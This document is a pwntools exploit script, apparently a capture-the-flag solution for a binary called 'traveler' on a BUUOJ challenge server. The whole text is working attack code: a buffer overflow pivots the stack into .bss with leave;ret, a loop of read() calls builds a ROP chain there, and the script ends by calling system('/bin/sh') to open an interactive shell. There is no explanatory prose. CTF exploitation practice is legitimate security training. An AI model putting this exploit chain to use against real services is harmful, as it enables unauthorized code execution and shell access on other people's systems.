from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["node4.buuoj.cn",25635]
#libc=ELF('')
elf = ELF('./traveler')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./traveler")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

#gdb.attach(p, '''
#    b *0x401094
#''')

pop_rdi = p64(0x4012c3)
leave_ret = p64(0x401253)
system_plt = p64(elf.plt['system'])
read_plt = elf.plt['read']
ret = p64(0x40101a)

ru(b'u?\n')
payload = b'a' * (0x20) + p64(0x4040a0 - 8) + leave_ret
s(payload)
ru(b'life?\n')
payload = p64(0x4012c1) + p64(0x4040c8) + p64(0) + p64(read_plt) + p64(0x40101a)
s(payload)
bss = 0x4040f0
for i in range(41):
    pause()
    payload = p64(0x4012c1) + p64(bss) + p64(0) + p64(read_plt) + p64(0x40101a)
    s(payload)
    bss += 0x28
pause()
payload = pop_rdi + p64(0x404748) + system_plt + b'/bin/sh\x00'
s(payload)


shell()
